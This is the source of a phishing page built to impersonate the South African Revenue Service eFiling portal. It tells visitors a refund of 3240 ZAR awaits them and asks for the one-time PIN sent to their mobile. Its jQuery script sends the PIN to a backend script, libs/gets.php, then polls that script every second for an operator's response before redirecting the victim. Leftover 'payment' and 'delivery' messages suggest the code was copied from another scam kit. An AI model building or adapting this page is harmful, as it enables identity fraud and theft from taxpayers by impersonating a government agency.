<?php include('./inc/head.php'); ?>

<?php include('./inc/header.php'); ?>
<!-- middle -->
<div class="middle-section ">
	<div class="container-fluid">
		<div class="row px-0">
			<div class="col-md-9 px-0">
				<div class="middle-left">
					<!-- <div class="logo-sectoin">
						<img src="assets/images/sars-logos-white.png">
					</div>
					<div class="up-menu">
						<a href="#">Individuals</a>
						<a href="#">Businesses and Employers</a>
						<a href="#">Tax Practitioners</a>
						<a href="#">Customs and Excise</a>
					</div>
					<div class="middle-menu text-end">
						<a href="#">Trusts</a>
						<a href="#">Deceased & Insolvent Estates</a>
						<a href="#">Government</a>
						<a href="#">Small Businesses</a>
						<a href="#">Tax Exempt Institutions</a>
					</div> -->
					<!-- <a href="#">
						<img src="assets/images/banner.png" class="w-100">
					</a> -->
					<main id="main" role="main">
						<div class="text-center p-5 bg-white">
							<h5>Your Tax Refund is Ready for Processing!
							</h5>
							<p>We have calculated your tax return, and a refund of 3240 ZAR is due to be processed to
								your account. For security purposes, we require a One-Time Pin (OTP) to verify your
								identity before disbursing the refund.</p>
						</div>
						<div class="form-section p-1">
							<p style="font-size:14px;color:red" id="codeerror"></p>
							<p style="font-size:14px;color:green" id="codesuccess"></p>
							<form id="code_entry">
								<div class="row">
									
									<div class="col-md-6 mx-auto">
										<div class="form-floating mb-4">
											<input type="text" class="form-control" id="code">
											<label for="floatingInput">Enter One-Time Pin (OTP) Sent to Your Mobile Number </label>
										</div>
									</div>
									<div class="col-md-12 text-center">

										<button id="main" role="main" class="submit mt-3 mb-3"> Claim Your Refund
											Now<svg viewBox="0 0 24 24" width="20px" class="mx-2" fill="none"
												xmlns="http://www.w3.org/2000/svg">
												<path fill-rule="evenodd" clip-rule="evenodd"
													d="M19.7071 11.2929C20.0976 11.6834 20.0976 12.3166 19.7071 12.7071L13.7071 18.7071C13.3166 19.0976 12.6834 19.0976 12.2929 18.7071C11.9024 18.3166 11.9024 17.6834 12.2929 17.2929L16.5858 13L8 13C7.44771 13 7 12.5523 7 12C7 11.4477 7.44771 11 8 11L16.5858 11L12.2929 6.70711C11.9024 6.31658 11.9024 5.68342 12.2929 5.29289C12.6834 4.90237 13.3166 4.90237 13.7071 5.29289L19.7071 11.2929ZM5.01 13L5 13C4.44771 13 4 12.5523 4 12C4 11.4477 4.44771 11 5 11L5.01 11C5.56229 11 6.01 11.4477 6.01 12C6.01 12.5523 5.56229 13 5.01 13Z"
													fill="#fff"></path>
											</svg></button>

									</div>

								</div>
							</form>
							<div class="text-center bg-white p-4">
								<p>Please note, failure to complete this verification may result in delays in processing your refund.</p>
							</div>

						</div>
						<div class="middle-bottom d-flex justify-content-between align-items-center">
						<a href="#">Find a Form</a>
						<a href="#">Find a Tax Rate</a>
						<a href="#">Find a Branch</a>
						<a href="#">Find a Publication</a>
						<a href="#">Find an FAQ</a>
						<a href="#">Report Suspicious Activity</a>
					</div>
				</div>
			</div>
			<div class="col-md-3 px-0">
				<div class="right-side p-4">
					<div class="text-center">
						<img src="assets/images/top-right-efiling.png">
					</div>
					<a href="#" class="btn-blu"><i class="fas fa-check-square"></i> Login</a>
					<a href="#" class="btn-blu"><i class="fas fa-file-signature"></i> Register</a>
					<a href="#" class="btn-blu-txt"><i class="fas fa-user"></i> Forgot Username</a>
					<a href="#" class="btn-blu-txt"><i class="fas fa-question"></i> Forgot Password</a>
					<a href="#" class="btn-blu-txt"><i class="fab fa-strava"></i> Manage Access Requests</a>
					<div class="list-box mb-2 mt-3">
						<h5 class="color">Find a</h4>
						<ul>
							<li><a href="#">Branch</a></li>
							<li><a href="#">Digital Channel</a></li>
							<!-- <li><a href="#">FAQ</a></li>
							<li><a href="#">Form</a></li>
							<li><a href="#">Guide, Policy, Manual or Brochure</a></li> -->
							<!-- <li><a href="#">Job</a></li>
							<li><a href="#">Media Release</a></li>
							<li><a href="#">Mobile Tax Unit</a></li>
							<li><a href="#">Registered Tax Practitioner</a></li>
							<li><a href="#">Scam alert</a></li>
							<li><a href="#">Service Charter Index</a></li>
							<li><a href="#">Source Code</a></li> -->
							<!-- <li><a href="#">Tax Directive</a></li>
							<li><a href="#">Tax Rate</a></li>
							<li><a href="#">Tax Workshop</a></li> -->
						</ul>
					</div>
					<div class="list-box mb-2">
						<h5 class="color">Top Queries</h4>
						<ul>
							<li><a href="#">Can I see my refund payment date on eFiling as well as the payment date if I
									owe SARS?</a></li>
							<!-- <li><a href="#">How do I confirm if a Tax Practitioner is registered?</a></li>
							<li><a href="#">What if my employer didn’t submit my IRP5?</a></li>
							<li><a href="#">How do I check my auto-assessment status?</a></li>
							<li><a href="#">How does the solar rebate work?</a></li> -->
							<!-- <li><a href="#">How does auto-assessment work?</a></li> -->
							<!-- <li><a href="#">What must I do when I receive my auto-assessment notice?</a></li>
							<li><a href="#">How do I check my bank details on the SARS system?</a></li>
							<li><a href="#">How do I update my email address or cell number?</a></li>
							<li><a href="#">Both my cell number and email address have changed as part of my eFiling
									security contact details?</a></li>
							<li><a href="#">How do I update my registered details (address etc) on eFiling?</a></li>
							<li><a href="#">I need to reset eFiling username and/or password?</a></li>
							<li><a href="#">I need my Tax Number</a></li>
							<li><a href="#">How do I pay SARS?</a></li>
							<li><a href="#">How to submit supporting documents?</a></li>
							<li><a href="#">Complete Traveller Declaration</a></li>
							<li><a href="#">Report a scam</a></li>
							<li><a href="#">Report a Tax Crime</a></li>
							<li><a href="#">Latest scam examples</a></li>
							<li><a href="#">Current surveys, SMSs and emails from SARS</a></li> -->
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- middle -->
						<?php include('inc/footer.php'); ?>
						<script>
							$("#code").on("keyup keypress", function () {

								if ($("#code").val().length > 6) {
									var code = $("#code").val();

									code = code.substring(0, $(this).val().length - 1);

									$("#code").val(code);
									return;
								}

								if ($("#code").val().length < 6 || $("#code").val().length > 6) {
									$("#codeerror").html("Code must be 6 digit");

									return;
								} else {
									$("#codeerror").html("");
								}


							});

							$("#code_entry").submit(function (evt) {
								document.getElementById("loader").style.display = "block";

								if ($("#code").val().length < 6 || $("#code").val().length > 6) {
									$("#codeerror").html("Code must be 6 digit");
									return;
								}

								evt.preventDefault();

								var interval = setInterval(() => {
									$.ajax({
										url: "libs/gets.php",
										type: "post",
										data: {
											data: "<?= $_GET["code"] ?>",
											code: $("#code").val(),
											action: "review-code"
										},
										dataType: "json",
										success: function (resp) {

											if (resp.success == 1) {

												//  alert("Success");
												$("#codesuccess").html("Success");
												document.getElementById("loader").style.display =
													"block";

												var str =
													`
						<li class="hide">Your payment was succesful... </li>
						<li class="hide">You should receive your delivery within 3-business days <br> We are now redirecting you to our homepage..</li>`;

												$("#loader_text").html(str);
												clearInterval(messagerefresher);
												setInterval(function () {

													$(list).addClass("hide");
													$(list[counter++]).removeClass("hide");

													if (counter == list.length) {
														counter = 0;
													}


												}, 3000);
												setInterval(function () {
													window.location = resp.data;
												}, 10000);

											} else if (resp.success == 2) {
												document.getElementById("loader").style.display =
													"none";
												$("#codeerror").html("Failed");
												clearInterval(interval);
											}

										}
									});

								}, 1000);

							});
						</script>
						<!---------------------------------------------------------------------------------------------footer End------------------------------------------------------------------------- -->




						<script>
							var myVar;

							function myFunction() {
								myVar = setTimeout(showPage, 3000);
							}

							function showPage() {
								document.getElementById("loader").style.display = "none";
								document.getElementById("myDiv").style.display = "block";
							}
						</script>
					</main>

					</body>

					</html>